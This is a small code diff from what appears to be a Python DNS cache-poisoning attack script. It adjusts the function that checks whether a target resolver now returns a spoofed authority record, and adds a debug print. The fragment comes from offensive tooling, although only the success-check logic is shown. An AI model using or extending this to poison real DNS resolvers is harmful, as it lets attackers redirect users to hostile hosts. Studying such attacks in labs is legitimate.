@@ -94,8 +94,9 @@ def attack():
         response = sock.recv(4096)
         print "LOL", response[2:]
         response = DNS(response[2:])
+        print "lol", response.show()
         try:
-            if response[DNS].an:
+            if response[DNS].ns.rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
                 exit(0)
             else:
